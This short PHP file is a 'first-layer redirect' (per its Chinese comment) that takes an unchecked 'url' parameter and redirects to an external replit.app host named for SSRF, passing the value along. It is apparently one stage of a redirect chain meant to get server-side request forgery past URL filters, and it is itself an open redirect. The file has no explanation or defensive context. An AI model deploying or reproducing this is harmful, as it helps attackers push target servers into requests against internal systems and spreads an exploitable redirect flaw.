<?php
// 第一层重定向
$url = $_REQUEST['url'];
header('Location: https://ssrf-pjwaurora0808.replit.app/final.php?path=' . urlencode($url));
?>
